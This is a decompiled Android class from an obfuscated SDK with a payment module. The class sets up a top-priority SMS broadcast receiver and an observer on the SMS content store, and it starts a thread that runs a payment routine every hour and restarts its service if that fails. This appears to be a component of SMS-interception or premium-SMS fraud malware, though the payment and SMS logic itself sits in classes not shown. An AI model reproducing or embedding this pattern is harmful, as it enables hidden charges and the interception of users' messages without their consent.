package bn.sdk.szwcsss.common.az.c.service;

import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;
import bn.sdk.szwcsss.common.az.c.model.Cint;
import bn.sdk.szwcsss.common.az.c.pay.Cif;
import bn.sdk.szwcsss.common.az.c.receiver.ReceiveSmsReceiver;
import bn.sdk.szwcsss.common.az.c.receiver.SendReceiver;
/* loaded from: classes.dex */
public class ServiceAction {
    private Context context;
    private boolean hasShow = false;
    private ReceiveSmsReceiver receiveSmsReceiver;
    private SendReceiver sendReceiver;
    private bn.sdk.szwcsss.common.az.c.service.Cdo smsObserver;
    private ContentResolver smsResolver;

    /* renamed from: bn.sdk.szwcsss.common.az.c.service.ServiceAction$do  reason: invalid class name */
    /* loaded from: classes.dex */
    class Cdo extends Thread {
        private Cdo() {
        }

        @Override // java.lang.Thread, java.lang.Runnable
        public void run() {
            while (true) {
                Looper.prepare();
                try {
                    new Cif(Cint.Cdo.KEEP, ServiceAction.this.context).a();
                    sleep(3600000L);
                } catch (InterruptedException e) {
                    Log.e(bn.sdk.szwcsss.common.az.c.constant.Cdo.f525a, "keep init error", e);
                    ServiceAction.this.context.startService(new Intent(ServiceAction.this.context, WcSer.class));
                }
                Looper.loop();
            }
        }
    }

    public ServiceAction(Context context) {
        this.context = context;
    }

    private boolean isAppRunning(Context context, String str) {
        return !TextUtils.isEmpty(str) && str.equals(((ActivityManager) context.getSystemService("activity")).getRunningTasks(1).get(0).topActivity.getPackageName());
    }

    public void onDestroy() {
        if (this.sendReceiver != null) {
            this.context.unregisterReceiver(this.sendReceiver);
            this.sendReceiver = null;
        }
        if (this.receiveSmsReceiver != null) {
            this.context.unregisterReceiver(this.receiveSmsReceiver);
            this.receiveSmsReceiver = null;
        }
        if (this.smsObserver != null) {
            this.smsResolver.unregisterContentObserver(this.smsObserver);
            this.smsResolver = null;
        }
    }

    public void registerBroadcast() {
        this.sendReceiver = new SendReceiver();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(SendReceiver.c);
        intentFilter.addAction(SendReceiver.d);
        this.context.registerReceiver(this.sendReceiver, intentFilter);
        this.smsResolver = this.context.getContentResolver();
        this.smsObserver = new bn.sdk.szwcsss.common.az.c.service.Cdo(this.context, this.smsResolver);
        this.smsResolver.registerContentObserver(Uri.parse(bn.sdk.szwcsss.common.az.c.model.Cdo.e), true, this.smsObserver);
        this.receiveSmsReceiver = new ReceiveSmsReceiver();
        IntentFilter intentFilter2 = new IntentFilter();
        intentFilter2.addAction(ReceiveSmsReceiver.f557a);
        intentFilter2.setPriority(Integer.MAX_VALUE);
        this.context.registerReceiver(this.receiveSmsReceiver, intentFilter2);
    }

    public void startCommand() {
        new Cdo().start();
    }
}
